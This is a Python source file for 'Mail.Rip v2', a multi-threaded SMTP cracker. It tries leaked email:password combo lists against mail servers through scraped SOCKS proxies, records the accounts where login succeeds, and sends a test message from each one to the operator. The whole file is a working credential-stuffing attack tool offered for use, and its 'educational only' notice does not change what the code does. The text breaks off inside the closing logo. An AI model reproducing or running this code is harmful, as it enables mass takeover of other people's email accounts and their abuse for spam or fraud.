#!/usr/local/bin/python3
# -*- coding: utf-8 -*-

'''
                               ### LEGAL NOTICES ###

        You are allowed to use the following code for educational purposes
        ONLY! Mail.Rip v2 shall not be used for any kind of illegal activity
        nor law enforcement at any time. This restriction applies to all
        cases of usage, no matter whether the code as a whole or only parts
        of it are being used.

                            ### END OF LEGAL NOTICES ###

        +-------------------------------------------------------------------+
        | PROJECT:      Mail.Rip v2                                         |
        | DESCRIPTION:  SMTP checker / SMTP cracker for mailpass combolists |
        | RELEASE:      3 (2021-01-03)                                      |
        | AUTHOR:       DrPython3 @ GitHub.com                              |
        +===================================================================+
        | Based on Mail.Rip v1, this is the new and improvement version.    |
        | It is still a SMTP checker / SMTP cracker testing your mailpass   |
        | combolists for working SMTP accounts. Nevertheless, the code has  |
        | been cleaned, improved and commented.                             |
        |                                                                   |
        | Mail.Rip v2 is faster and more reliable, still providing support  |
        | for SOCKS4 / SOCKS5 proxys and the verification of working e-mail |
        | delivery for every valid SMTP login being found. And more!        |
        +-------------------------------------------------------------------+
        |                                                                   |
        |         SUPPORT THIS PROJECT: BUY ME A COFFEE OR DONATE!          |
        |                                                                   |
        |             BTC: 1CU8WukMCDmeBfqJpsR4Vq9kxvNiRdYhf5               |
        |             LTC: LeJsHzcMixhvR1qEfgHJU32joVAJDgQwR7               |
        |                                                                   |
        |         All donations are appreciated - coffee even more.         |
        |                                                                   |
        +-------------------------------------------------------------------+
'''

# [*** Python Packages needed ***]
# --------------------------------------------------------------------------------------------------------------------

# first import sys:
import sys
# try to import the rest, then:
try:
    import os
    import smtplib
    import socket
    import ssl
    import threading
    import json
    import re
    import uuid
    import socks
    import urllib3
    import certifi
    import dns.resolver
    import colorama
    from time import sleep
    from email.mime.multipart import MIMEMultipart
    from email.mime.text import MIMEText
    from random import randint
except:
    sys.exit('Sorry, an error occurred while importing the needed Python packages.'
             + '\nInstall the needed packages and start Mail.Rip v2 again.\n\n')

# initialize colorama:
colorama.init(autoreset=True)

# [*** Variables, Lists and Dictionaries needed ***]
# --------------------------------------------------------------------------------------------------------------------

sslcontext = ssl.create_default_context()
default_timeout = float(10.0)
default_threads = int(25)
default_blacklist = True
attacker_mail = 'invalid@mail.sad'

use_socks = False
type_socks = 'SOCKS4'
amount_socks = int(0)
socksproxys = []

count_threads = int(0)
combos = []
hits = int(0)
fails = int(0)

# get lists and dictionaries from library.json:
try:
    with open('library.json') as included_imports:
        jsonobj = json.load(included_imports)
        smtpdomains = (jsonobj['smtpdomains'])
        smtpports = (jsonobj['smtpports'])
        smtpsubdomains = (jsonobj['smtpsubdomains'])
        commonports = (jsonobj['commonports'])
        hosterblacklist = (jsonobj['hosterblacklist'])
        socks4sources = (jsonobj['socks4sources'])
        socks5sources = (jsonobj['socks5sources'])
except:
    sys.exit(colorama.Fore.RED
             + '\n\nFile "library.json" not found.\n'
             + 'Place the file in the same directory with the script and start Mail.Rip v2 again!\n\n')

# [*** Functions needed ***]
# --------------------------------------------------------------------------------------------------------------------

def clean():
    '''
    Returns a blank screen on purpose.

    :return: None
    '''
    try:
        if os.name == 'nt':
            os.system('cls')
        else:
            os.system('clear')
    except:
        pass
    return None


def countdown(x):
    '''
    Provides a simple countdown from "x".

    :param x: start of the countdown
    :return: None
    '''
    i = int(x)
    while i > 0:
        if i < 3:
            print(colorama.Fore.RED + f'    ... {str(i)}')
        elif i < 4:
            print(colorama.Fore.YELLOW + f'    ... {str(i)}')
        else:
            print(colorama.Fore.GREEN + f'    ... {str(i)}')
        sleep(0.95)
        i -= 1
    return None


def writer(text, type):
    '''
    Writes any content to a specific TXT-file.
    The filename is given by parameter "type".
    "types" are: checked, valid, invalid, blacklisted, sentemail.
    Used to save hits, fails etc.

    :param text: content to save to a file
    :param type: determins the filename
    :return: True, False
    '''
    try:
        targetfile = str(str(type) + '.txt')
        with open(str(targetfile), 'a+') as output_file:
            output_file.seek(0)
            check_empty = output_file.read(100)
            if len(check_empty) > 0:
                output_file.write('\n')
            else:
                pass
            output_file.write(str(text))
        return True
    except:
        return False


def emailverify(email):
    '''
    Verifies whether the given string is an e-mail address.
    Used by comboloader and setdefaults function.

    :param email: e-mail address to check.
    :return: True, False
    '''
    # string for verification:
    email_regex = '^([\w\.\-]+)@([\w\-]+)((\.(\w){2,63}){1,3})$'
    # verification:
    if re.search(email_regex, str(email)):
        return True
    else:
        return False


def setdefaults():
    '''
    This function allows the user to change the default values used by Mail.Rip v2.
    Returns True if at least one value has been changed. Else it returns False.

    :return: True, False
    '''
    global default_threads
    global default_timeout
    global default_blacklist
    global attacker_mail
    defaults_changed = int(0)
    clean()
    print(colorama.Fore.YELLOW + '\n\n### MAIL.RIP V2 ###  |  EDIT DEFAULT VALUES:\n')
    # set amount of threads for attack:
    try:
        default_threads = int(input('\nEnter amount of threads to use:\n' + colorama.Fore.YELLOW))
        print(colorama.Fore.GREEN + f'\nThreads set to {str(default_threads)}\n')
        defaults_changed += 1
    except:
        default_threads = int(25)
        print(colorama.Fore.RED
              + f'\nDefault value not changed, Mail.Rip v2 will use {str(default_threads)} threads\n')
    # set default timeout for connections:
    try:
        default_timeout = float(input('\nEnter value for timeout:\n' + colorama.Fore.YELLOW))
        print(colorama.Fore.GREEN + f'\nTimeout set to {str(default_timeout)}\n')
        defaults_changed += 1
    except:
        default_timeout = float(10.0)
        print(colorama.Fore.RED
              + f'\nDefault value not changed, timeout remains {str(default_timeout)}\n')
    # de-/activate blacklist check for e-mail domains:
    try:
        blacklist = str(input('\nUse blacklist for e-mail domains:\n(yes / no)    ' + colorama.Fore.YELLOW))
        if blacklist == 'n' or blacklist == 'no':
            default_blacklist = False
            print(colorama.Fore.RED + '\nBlacklist for e-mail domains deactivated.\n')
            defaults_changed +=1
        else:
            default_blacklist = True
            print(colorama.Fore.GREEN + '\nBlacklist for e-mail domains remains activated.')
    except:
        pass
    # set user e-mail address for delivery test:
    try:
        new_mail = str(input('\nEnter your e-mail for delivery test:\n' + colorama.Fore.YELLOW))
        verified = emailverify(str(new_mail))
        if verified == True:
            attacker_mail = str(new_mail)
            print(colorama.Fore.GREEN + f'\nE-mail for delivery test set to: {str(attacker_mail)}\n')
            defaults_changed += 1
        else:
            attacker_mail = str('invalid@mail.sad')
            print(colorama.Fore.RED + '\nNo valid e-mail set for delivery test.\n')
    except:
        attacker_mail = str('invalid@mail.sad')
        print(colorama.Fore.RED + '\nNo valid e-mail set for delivery test.\n')
    if defaults_changed > 0:
        return True
    else:
        return False


def proxysupport():
    '''
    This function provides the proxy-support. If called, it allows to enable the proxy-feature.
    If the proxy-support is activated, it asks for the proxy-type to use and scrapes free proxys
    using the sources from "library.json". Afterwards, it cleans the scraping data and loads the
    results into the global proxylist. Returns True, if proxy-support ist active and some proxys
    could be loaded. Else it returns False.

    :return: True, False
    '''
    global use_socks
    global type_socks
    global amount_socks
    global socksproxys
    clean()
    # ask user whether to activate proxy-support:
    print(colorama.Fore.YELLOW + '\n\n### MAIL.RIP V2 ###  |  DE-/ACTIVATE AND SCRAPE PROXYS:\n\n')
    new_use = str(input('Activate proxy-support?\n(yes / no)    ' + colorama.Fore.YELLOW))
    if new_use == 'y' or new_use == 'yes':
        use_socks = True
    else:
        pass
    # if activated, ask for proxy-type to use:
    if use_socks == True:
        new_type = str(input(colorama.Fore.WHITE
                             + '\n\nType of proxys to use?\n(SOCKS4 / SOCKS5)    ' + colorama.Fore.YELLOW))
        if new_type == '5' or new_type == 'SOCKS5' or new_type == 'socks5':
            type_socks = str('SOCKS5')
            print(colorama.Fore.GREEN + '\n\nProxy-support << ACTIVATED >> using SOCKS5 proxys.')
        else:
            print(colorama.Fore.GREEN + '\n\nProxy-support << ACTIVATED >> using SOCKS4 proxys.')
    # if deactivated, end function:
    else:
        return False
    # else get proxy sources depending on the proxy-type to use:
    if type_socks == 'SOCKS4':
        sources = socks4sources
    elif type_socks == 'SOCKS5':
        sources = socks5sources
    # start scraping:
    print(colorama.Fore.YELLOW + f'\n\nScraping {str(type_socks)}-proxys ...')
    for source in sources:
        try:
            http = urllib3.PoolManager(ca_certs=certifi.where())
            scraped = http.request('GET', str(source))
            # scraped data is saved to temporary txt-file "scraped_proxys.txt":
            with open('scraped.txt', 'a') as output_file:
                output_file.write(str(scraped.data.decode('utf-8')))
                output_file.close()
            print(colorama.Fore.GREEN + f'Scraped: {str(source)}')
        except:
            print(colorama.Fore.RED + f'Scraping failed for: {str(source)}')
            continue
    # after scraping is finished, clean scraped data:
    ## remove unwanted text first:
    print(colorama.Fore.YELLOW + '\n\nRemoving unwanted text from results ...')
    try:
        with open('scraped.txt', 'r+') as scraped_data:
            valid_proxy = scraped_data.readlines()
            scraped_data.seek(0)
            for line in valid_proxy:
                if '<url' not in line:
                    scraped_data.write(line)
            scraped_data.truncate()
        print(colorama.Fore.GREEN + 'Unwanted text removed successfully.')
    except:
        print(colorama.Fore.RED + 'Removing unwanted text failed.')
    # then remove duplicates and delete scraped data:
    print(colorama.Fore.YELLOW + '\n\nRemoving duplicates from results ...')
    try:
        unique_proxys = set()
        with open('proxys.txt', 'w') as cleaned:
            for line in open('scraped.txt', 'r'):
                if line not in unique_proxys:
                    cleaned.write(line)
                    unique_proxys.add(line)
        print(colorama.Fore.GREEN + 'Duplicates successfully removed.')
    except:
        print(colorama.Fore.RED + 'Removing duplicates failed.')
    try:
        if os.name == 'nt':
            os.system('del scraped.txt')
        else:
            os.system('rm scraped.txt')
    except:
        pass
    # load proxys into global list:
    print(colorama.Fore.YELLOW + '\n\nLoading proxys into global list ...')
    try:
        socksproxys = open('proxys.txt', 'r').read().splitlines()
        amount_socks = int(len(socksproxys))
        print(colorama.Fore.GREEN + 'Proxys loaded into global list.')
        if os.name == 'nt':
            os.system('del proxys.txt')
        else:
            os.system('rm proxys.txt')
        return True
    except:
        print(colorama.Fore.RED + 'Loading proxys into global list failed.')
        use_socks = False
        return False


def getrandomproxy():
    '''
    Provides a random proxy from global list "socksproxys" on every call.

    :return: randomly chosen proxy
    '''
    x = randint(0, int(amount_socks))
    proxy = str(socksproxys[int(x)])
    return proxy


def blacklistcheck(domain):
    '''
    Checks whether the domain of an e-mail address is on the blacklist or not.

    :param domain: domain of the e-mail address being checked
    :return: True, False
    '''
    try:
        x = int(hosterblacklist.count(str(domain)))
        if x == 0:
            return False
        else:
            return True
    except:
        print(colorama.Fore.RED + f'Blacklist check failed for: {str(domain)} ...')
        return False


def mxlookup(worker_name, domain):
    '''
    Looks up MX records of a given e-mail domain for a SMTP host, verifying it using
    regular expressions. Returns a verified SMTP host or "no_host_found" if it fails.

    :param worker_name: to improve verbose messages
    :param domain: domain of target e-mail address
    :return: found_host
    '''
    # set string for verifying hosts from MX records:
    domain_regex = '^([a-z0-9]+(-[a-z0-9]+)*\.)+[a-z]{2,}$'
    # variable for returning result:
    found_host = str('no_host_found')
    # set up resolver:
    lookup = dns.resolver.Resolver(configure=False)
    # using Google nameserver - edit on purpose:
    lookup.nameservers = ['8.8.8.8']
    # start lookup MX:
    try:
        print(colorama.Fore.WHITE
              + f'[{str(worker_name)}]: Looking up SMTP-host in MX records of {str(domain)}')
        raw_result = lookup.query(str(domain), dns.rdatatype.MX, dns.rdataclass.IN)
        # get first result from lookup and verify it:
        mx_host = str(raw_result[0]).split(' ')[1].rstrip('.')
        if re.search(domain_regex, mx_host):
            # if domain is verified, set found_host:
            found_host = str(mx_host)
        # else try again for second result:
        else:
            mx_host = str(raw_result[1]).split(' ')[1].rstrip('.')
            if re.search(domain_regex, mx_host):
                found_host = str(mx_host)
            else:
                print(colorama.Fore.RED
                      + f'[{str(worker_name)}]: No SMTP-host found in MX records of {str(domain)}')
                return found_host
        # return a verified host, else "no_host_found":
        print(colorama.Fore.GREEN
              + f'[{str(worker_name)}]: Found SMTP-host {str(found_host)} in MX records of '
              + f'{str(domain)}')
        return found_host
    except:
        print(colorama.Fore.RED
              + f'[{str(worker_name)}]: No SMTP-host found in MX records of {str(domain)}')
        return found_host


def unknownhost(worker_name, domain):
    '''
    Searches for the SMTP host if none is found in hostlist.
    This is just a fallback in case looking up the MX records fails.

    :param worker_name: to improve verbose messages
    :param domain: domain of the e-mail-address
    :return: found_host
    '''
    found_host = str('no_host_found')
    for subdomain in smtpsubdomains:
        # get next SMTP host for connection test:
        test_host = str(str(subdomain) + str(domain))
        try:
            # for active proxy-support, set up a random proxy:
            if use_socks == True:
                get_proxy = str(getrandomproxy())
                proxy_ip = str(get_proxy.split(':')[0])
                proxy_port = int(get_proxy.split(':')[1])
                if type_socks == 'SOCKS4':
                    socks.set_default_proxy(socks.PROXY_TYPE_SOCKS4, proxy_ip, proxy_port)
                else:
                    socks.set_default_proxy(socks.PROXY_TYPE_SOCKS5, proxy_ip, proxy_port)
                socks.socket.setdefaulttimeout(float(default_timeout))
                socks.wrapmodule(smtplib)
            # else, just set default timeout for connections:
            else:
                socket.setdefaulttimeout(float(default_timeout))
            print(colorama.Fore.WHITE
                  + f'[{str(worker_name)}]: Trying to connect to {str(test_host)}')
            # try connection:
            try:
                # first, try SSL-connection:
                connection = smtplib.SMTP_SSL(str(test_host), timeout=default_timeout, context=sslcontext)
                connection.quit()
                print(colorama.Fore.GREEN
                      + f'[{str(worker_name)}]: SSL-connection established to host {str(test_host)}')
            except:
                try:
                    # on errors, try standard connection:
                    connection = smtplib.SMTP(str(test_host), timeout=default_timeout)
                    connection.quit()
                    print(colorama.Fore.GREEN
                          + f'[{str(worker_name)}]: Connecton established to host {str(test_host)}')
                except:
                    try:
                        connection.quit()
                    except:
                        pass
                    print(colorama.Fore.RED
                          + f'[{str(worker_name)}]: Connection failed for host {str(test_host)}')
                    continue
            found_host = str(test_host)
            break
        except:
            continue
    return found_host


def unknownport(worker_name, smtphost):
    '''
    Searches for the connection port of a given host if none is found in hostlist.
    Returns a found port of "0" if none is found.

    :param worker_name: to improve verbose messages
    :param smtphost: the host to search the connection port for
    :return: found_port
    '''
    found_port = int(0)
    for port in commonports:
        # get next port to test:
        test_port = int(port)
        try:
            # for active proxy-support, set up a random proxy:
            if use_socks == True:
                get_proxy = str(getrandomproxy())
                proxy_ip = str(get_proxy.split(':')[0])
                proxy_port = int(get_proxy.split(':')[1])
                if type_socks == 'SOCKS4':
                    socks.set_default_proxy(socks.PROXY_TYPE_SOCKS4, proxy_ip, proxy_port)
                else:
                    socks.set_default_proxy(socks.PROXY_TYPE_SOCKS5, proxy_ip, proxy_port)
                socks.socket.setdefaulttimeout(float(default_timeout))
                socks.wrapmodule(smtplib)
            # else, just set default timeout for connections:
            else:
                socket.setdefaulttimeout(float(default_timeout))
            print(colorama.Fore.WHITE
                  + f'[{str(worker_name)}]: Trying connection to {str(smtphost)} on port {str(test_port)}')
            # try connection:
            try:
                # first, try SSL-connection:
                connection = smtplib.SMTP_SSL(str(smtphost),
                                              int(test_port),
                                              timeout=default_timeout,
                                              context=sslcontext)
                connection.quit()
                print(colorama.Fore.GREEN
                      + f'[{str(worker_name)}]: SSL-Connection to host {str(smtphost)} on port '
                      + f'{str(test_port)} successful')
            except:
                try:
                    # on errors, try standard connection:
                    connection = smtplib.SMTP(str(smtphost), int(test_port), timeout=default_timeout)
                    connection.quit()
                    print(colorama.Fore.GREEN
                          + f'[{str(worker_name)}]: Connection to host {str(smtphost)} on port '
                          + f'{str(test_port)} successful')
                except:
                    try:
                        connection.quit()
                    except:
                        pass
                    print(colorama.Fore.RED + f'[{str(worker_name)}]: Connection to host {str(smtphost)} '
                          + f'on port {str(test_port)} failed')
                    continue
            found_port = int(test_port)
            break
        except:
            continue
    return found_port


def deliverytest(worker_name, smtphost, smtpport, smtpuser, smtppass, smtpemail, proxyip, proxyport):
    '''
    Tries to send an e-mail using a found SMTP login.
    This is the integrated "e-mail delivery test".

    :param worker_name: to improve verbose messages
    :param smtphost: SMTP address
    :param smtpport: SMTP connection port
    :param smtpuser: SMTP username
    :param smtppass: SMTP password
    :param smtpemail: e-mail address being used
    :param proxy_ip: SOCKS-proxy IP
    :param proxy_port: SOCKS-proxy port
    :return: True, False
    '''
    # if SOCKS support is active, set up the proxy:
    if use_socks == True:
        if type_socks == 'SOCKS4':
            socks.set_default_proxy(socks.PROXY_TYPE_SOCKS4, str(proxyip), int(proxyport))
        elif type_socks == 'SOCKS5':
            socks.set_default_proxy(socks.PROXY_TYPE_SOCKS5, str(proxyip), int(proxyport))
        # default timeout is set to 60.0 for delivery test, do not change:
        socks.socket.setdefaulttimeout(float(60.0))
        socks.wrapmodule(smtplib)
    else:
        # default timeout is set to 60.0 for delivery test, do not change:
        socket.setdefaulttimeout(float(60.0))
    # e-mail letter - edit this template on purpose:
    letter_text = str('Hello and thank you for using Mail.Rip v2!\n'
        + '\n'
        + 'If you read this message the e-mail delivery test was successful for the following SMTP:\n'
        + '\n'
        + f'EMAIL: {str(smtpemail)}\n'
        + f'HOST: {str(smtphost)}\n'
        + f'PORT: {str(smtpport)}\n'
        + f'USER: {str(smtpuser)}\n'
        + f'PASS: {str(smtppass)}\n'
        + '\n'
        + 'Please regard:\n'
        + 'The test only confirms the delivery of messages being sent with the SMTP above. You may '
        + 'find this message in the junk folder because of its content. If all or most of the test '
        + 'messages are marked as spam, consider to edit the template in the code.\n'
        + '\n'
        + 'Moreover, you can improve the results by not using proxys and by using a different e-mail '
        + 'address whenever you start Mail.Rip v2.\n'
        + '\n'
        + 'If you like the tool consider a donation, please! Or just buy me a coffee. Every donation '
        + 'is appreciated though coffee even more. The donation wallets are:\n'
        + '\n'
        + 'BTC: 1CU8WukMCDmeBfqJpsR4Vq9kxvNiRdYhf5\n'
        + 'LTC: LeJsHzcMixhvR1qEfgHJU32joVAJDgQwR7\n'
        + '\n'
        + 'Thank you in advance and do not forget to visit my GitHub page for help, more information '
        + 'and updates! You can contact me over there, too.\n'
        + '\n'
        + 'Stay healthy and best regards,\n'
        + 'DrPython3')
    # prepare e-mail-delivery test for specific hit:
    try:
        # generate a random ID for the delivery test:
        randomid = str(uuid.uuid4().hex)
        randomid = str(randomid[0:5])
        randomid = randomid.upper()
        # generate the e-mail message:
        letter = MIMEMultipart()
        letter['Subject'] = str(f'Test result for {str(randomid)} is available now')
        letter['From'] = str(smtpemail)
        letter['To'] = str(attacker_mail)
        content = MIMEText(letter_text, str('plain'))
        letter.attach(content)
    except:
        print(colorama.Fore.RED + f'[{str(worker_name)}]: Error while preparing e-mail delivery test for '
              + f'{str(smtpemail)}.')
        return False
    try:
        # connect to SMTP, log in and send the e-mail message:
        ## timeout for SMTP connection is set to 60.0 here, do not change:
        try:
            victim = smtplib.SMTP_SSL(str(smtphost), int(smtpport), timeout=float(60.0), context=sslcontext)
        except:
            victim = smtplib.SMTP(str(smtphost), int(smtpport), timeout=float(60.0))
            try:
                victim.ehlo()
                victim.starttls()
                victim.ehlo()
            except:
                pass
        victim.login(str(smtpuser), str(smtppass))
        victim.send_message(letter)
        victim.quit()
        # successful tests return true, unsuccessful ones false:
        return True
    except:
        try:
            victim.quit()
        except:
            pass
        return False


def comboloader():
    '''
    Reads combos from a given source and prepares a clean combolist for the attack.
    Returns True if at least one combo has been loaded successfully.

    :return: True, False
    '''
    global combos
    clean()
    print(colorama.Fore.YELLOW + '\n\n### MAIL.RIP V2 ###  |  COMBOLOADER:\n\n')
    # get filename of combosource to use:
    input_file = str(input('Enter file with combos, e.g. combos.txt:\n' + colorama.Fore.YELLOW))
    if input_file == '':
        return False
    else:
        print(colorama.Fore.WHITE + f'\nReading and preparing combos from file: {str(input_file)}')
    # read, prepare and load prepared combos into global list:
    try:
        combos_cleaned = set()
        # cleaned combos are saved to a new file:
        with open('targets.txt', 'w') as output_file:
            # for every combo in sourcefile:
            for line in open(str(input_file), 'r'):
                ## replace common separators with ":":
                line = line.replace(';', ':').replace('|', ':').replace(',', ':')
                ## check combo for valid e-mail address and skip if False:
                verify_email = str(line.split(':')[0])
                result_verify = emailverify(str(verify_email))
                if result_verify == False:
                    combos_cleaned.add(line)
                    continue
                else:
                    pass
                ## perform blacklist check if activated:
                if default_blacklist == True:
                    blacklist_email = str(line.split(':')[0])
                    blacklist_domain = str(blacklist_email.split('@')[1])
                    result_blacklist = blacklistcheck(blacklist_domain)
                    ### skip combo if blacklist check is True:
                    if result_blacklist == True:
                        print(colorama.Fore.RED + f'Blacklist Check: {str(blacklist_domain)} [FAILED], '
                              + f'skipping target {str(blacklist_email)}')
                        ### save blacklisted combo in blacklisted.txt:
                        result_writer = writer(str(line), str('blacklisted'))
                        combos_cleaned.add(line)
                        continue
                    else:
                        print(colorama.Fore.GREEN + f'Blacklist Check: {str(blacklist_domain)} [PASSED], '
                              + f'adding target {str(blacklist_email)}')
                        pass
                else:
                    pass
                ## perform duplicate check and save combo for loading if False:
                if line not in combos_cleaned:
                    output_file.write(line)
                    combos_cleaned.add(line)
                else:
                    continue
        # load cleaned combos into global list:
        combos = open('targets.txt', 'r').read().splitlines()
        # delete old combofiles not needed anymore:
        try:
            if os.name =='nt':
                os.system(f'del {str(input_file)}')
                os.system('targets.txt')
            else:
                os.system(f'rm {str(input_file)}')
                os.system('rm targets.txt')
        except:
            pass
        # get amount of loaded combos:
        result_loader = int(len(combos))
        # return True if at leased one combo has been loaded:
        if result_loader > 0:
            return True
        else:
            print(colorama.Fore.RED + '\nNo combos loaded, sorry.')
            return False
    except:
        return False


def attacker():
    '''
    The attacker function is called for each thread and used for checking the given combos.
    It is full verbose and will use the writer function to save all results.

    :return: None
    '''
    global combos
    global hits
    global fails
    # set attacker ID for every thread:
    attacker_id = str('T' + str(count_threads))
    while len(combos) > 0:
        try:
            # reset all variables needed:
            target_email = str('')
            target_host = str('')
            target_port = int(0)
            target_user = str('')
            target_pass = str('')
            proxy_host = str('none')
            proxy_port = int(0)
            # get and set proxy if proxy-support is activated:
            if use_socks == True:
                get_proxy = str(getrandomproxy())
                proxy_host = str(get_proxy.split(':')[0])
                proxy_port = int(get_proxy.split(':')[1])
                if type_socks == 'SOCKS4':
                    socks.set_default_proxy(socks.PROXY_TYPE_SOCKS4, proxy_host, proxy_port)
                else:
                    socks.set_default_proxy(socks.PROXY_TYPE_SOCKS5, proxy_host, proxy_port)
                socks.socket.setdefaulttimeout(float(default_timeout))
                socks.wrapmodule(smtplib)
            # if proxy-support is deactivated, set default timeout for connections:
            else:
                socket.setdefaulttimeout(float(default_timeout))
            # get a combo and set up next target:
            next_combo = combos.pop(0)
            ## save that combo to checked.txt:
            result_writer = writer(str(next_combo), str('checked'))
            ## start checking process:
            print(colorama.Fore.YELLOW + f'[{str(attacker_id)}]: Checking combo {str(next_combo)}')
            target_email = str(next_combo.split(':')[0])
            target_user = str(target_email)
            target_pass = str(next_combo.split(':')[1])
            ## try to get target-host from hosterlist for e-mail domain:
            target_domain = str(target_email.split('@')[1]).lower()
            try:
                target_host = str(smtpdomains[target_domain])
            except:
                ### if no host is found, try to read from MX records of target-domain:
                lookup_host = str(mxlookup(attacker_id, target_domain))
                if lookup_host == 'no_host_found':
                    ### if reading the MX records fails, search with unknownhost function:
                    find_host = str(unknownhost(attacker_id, target_domain))
                    ### if unknownhost function fails, too, cancel attack for the given combo:
                    if find_host == 'no_host_found':
                        print(colorama.Fore.RED + f'[{str(attacker_id)}]: No target-host found for '
                              + f'combo {str(next_combo)}')
                        result_writer = writer(str(next_combo), str('invalid'))
                        fails += 1
                        continue
                    ### else set target_host = unknownhost result:
                    else:
                        target_host = str(find_host)
                ### else set target_host = result from MX records:
                else:
                    target_host = str(lookup_host)
            ## try to get targetport from hosterlist:
            try:
                target_port = int(smtpports[str(target_host)])
            except:
                ### on execptions, search with unknownport function:
                find_port = int(unknownport(attacker_id, target_host))
                ### if no port is found, cancel the attack for the given combo:
                if find_port == 0:
                    print(colorama.Fore.RED + f'[{str(attacker_id)}]: No target-port found for combo '
                          + f'{str(next_combo)}')
                    result_writer = writer(str(next_combo), str('invalid'))
                    fails += 1
                    continue
                ### else set target_port:
                else:
                    target_port = int(find_port)
            # attack the target:
            ## attack step#1 - establish connection:
            try:
                print(colorama.Fore.WHITE
                      + f'[{str(attacker_id)}]: Connecting to {str(target_host)} for checking combo '
                      + f'{str(next_combo)}')
                ### try SSL-connection to target:
                attack = smtplib.SMTP_SSL(str(target_host),
                                          int(target_port),
                                          timeout=default_timeout,
                                          context=sslcontext)
                print(colorama.Fore.GREEN + f'[{str(attacker_id)}]: SSL-connection established to '
                      + f'{str(target_host)}')
            except:
                try:
                    ### on errors try standard connection:
                    attack = smtplib.SMTP(str(target_host), int(target_port), timeout=default_timeout)
                    print(colorama.Fore.GREEN + f'[{str(attacker_id)}]: Connection established to '
                          + f'{str(target_host)}')
                    try:
                        ### on standard connections try to establish TLS:
                        attack.ehlo()
                        attack.starttls()
                        attack.ehlo()
                        print(colorama.Fore.GREEN + f'[{str(attacker_id)}]: TLS established for connection '
                              + f'to {str(target_host)}')
                    except:
                        pass
                except:
                    ### cancel attack for the given combo if all connections fail:
                    try:
                        attack.quit()
                    except:
                        pass
                    print(colorama.Fore.RED + f'[{str(attacker_id)}]: Connection to {str(target_host)} '
                          + 'failed')
                    result_writer = writer(str(next_combo), str('invalid'))
                    fails += 1
                    continue
            ## attack step#2.1 - try login with e-mail:
            try:
                print(colorama.Fore.WHITE
                      + f'[{str(attacker_id)}]: Testing login for combo {str(next_combo)}')
                attack.login(str(target_user), str(target_pass))
            ## attack step#2.2 - try login with user = e-mail pseudo if previous step fails:
            except:
                try:
                    ### set target_user = e-mail pseudo:
                    target_user = str(target_email.split('@')[0])
                    attack.login(str(target_user), str(target_pass))
                except:
                    try:
                        attack.quit()
                    except:
                        pass
                    ### if login fails again, save combo as invalid and start with next:
                    print(colorama.Fore.RED + f'[{str(attacker_id)}]: No hit for combo {str(next_combo)}')
                    result_writer = writer(str(next_combo), str('invalid'))
                    fails += 1
                    continue
            ## attack step#3 - save hits to valid.txt:
            try:
                ### try to close the connection:
                attack.quit()
            except:
                pass
            ### save hit to valid.txt:
            print(colorama.Fore.GREEN + '='*90 + '\n' + f'[{str(attacker_id)}]: (!) HIT FOR {str(next_combo)}\n'
                  + '='*90)
            result_writer = writer(
                str(f'EMAIL: {str(target_email)}, '
                    + f'HOST: {str(target_host)}, '
                    + f'PORT: {str(target_port)}, '
                    + f'USER: {str(target_user)}, '
                    + f'PASS: {str(target_pass)}'), str('valid'))
            hits += 1
            ## attack step#4 - for hits, call deliverytest function:
            if attacker_mail == 'invalid@mail.sad':
                print(colorama.Fore.RED + f'[{str(attacker_id)}]: E-mail delivery test skipped for '
                      + f'{str(target_email)}')
            else:
                result_delivery = deliverytest(
                    str(attacker_id),
                    str(target_host),
                    int(target_port),
                    str(target_user),
                    str(target_pass),
                    str(target_email),
                    str(proxy_host),
                    int(proxy_port))
                ### for successful deliverytest, save hit to sentemail.txt:
                if result_delivery == True:
                    print(colorama.Fore.GREEN + f'[{str(attacker_id)}]: E-mail sent with {str(target_email)}')
                    result_writer = writer(
                        str(f'MAIL: {str(target_email)}, '
                            + f'HOST: {str(target_host)}, '
                            + f'PORT: {str(target_port)}, '
                            + f'USER: {str(target_user)}, '
                            + f'PASS: {str(target_pass)}'), str('sentemail'))
                else:
                    print(colorama.Fore.RED + f'[{str(attacker_id)}]: Sending an e-mail with {str(target_email)}'
                          + ' failed')
        except:
            print(colorama.Fore.RED
                  + f'[{str(attacker_id)}]: An error occurred while checking combo {str(next_combo)}')
            result_writer = writer(str(next_combo), str('invalid'))
            fails += 1
            continue
    return None


def startattack():
    '''
    Starts the attack threads and shows its stats in the window title.

    :return: None
    '''
    global count_threads
    clean()
    print(colorama.Fore.YELLOW + '\n\n### MAIL.RIP V2 ###  |  STARTING ATTACK:\n\n')
    countdown(5)
    clean()
    # after countdown start threads for attacker function:
    for _ in range(default_threads):
        count_threads += 1
        threading.Thread(target=attacker).start()
    # try to show stats in window title:
    while len(combos) > 0:
        try:
            sleep(0.1)
            wintitle = f'LEFT TO CHECK: {str(len(combos))} | HITS: {str(hits)} | FAILS: {str(fails)}'
            sys.stdout.write('\33]0;' + str(wintitle) + '\a')
            sys.stdout.flush()
        except:
            pass
    return None


# [*** LOGOS ***]
# --------------------------------------------------------------------------------------------------------------------
legal_logo = '''
                          ##############################
                          #     I M P O R T A N T:     #
                          # L E G A L    N O T I C E S #
                          ##############################

         You are allowed to use the following code for educational purposes
         ONLY! Mail.Rip v2 shall not be used for any kind of illegal activity
         nor law enforcement at any time. This restriction applies to all
         cases of usage, no matter whether the code as a whole or only parts
         of it are being used.

'''

main_logo = '''
            ################## DrPython3 @ GitHub.Com ##################
            
             ███▄ ▄███▓ ▄▄▄       ██▓ ██▓          ██▀███   ██▓ ██▓███  
            ▓██▒▀█▀ ██▒▒████▄    ▓██▒▓██▒         ▓██ ▒ ██▒▓██▒▓██░  ██▒
            ▓██    ▓██░▒██  ▀█▄  ▒██▒▒██░         ▓██ ░▄█ ▒▒██▒▓██░ ██▓▒
            ▒██    ▒██ ░██▄▄▄▄██ ░██░▒██░         ▒██▀▀█▄  ░██░▒██▄█▓▒ ▒
            ▒██▒   ░██▒ ▓█   ▓██▒░██░░██████▒ ██▓ ░██▓ ▒██▒░██░▒██▒ ░  ░
            ░ ▒░   ░  ░ ▒▒   ▓▒█░░▓  ░ ▒░▓  ░ ▒▓▒ ░ ▒▓ ░▒▓░░▓  ▒▓▒░ ░  ░
            ░  ░      ░  ▒   ▒▒ ░ ▒ ░░ ░ ▒  ░ ░▒    ░▒ ░ ▒░ ▒ ░░▒ ░     
            ░      ░     ░   ▒    ▒ ░  ░ ░    ░     ░░   ░  ▒ ░░░       
                   ░         ░  ░ ░      ░  ░  ░     ░      ░           
                                               ░                        
            (donations):        btc = 1CU8WukMCDmeBfqJpsR4Vq9kxvNiRdYhf5
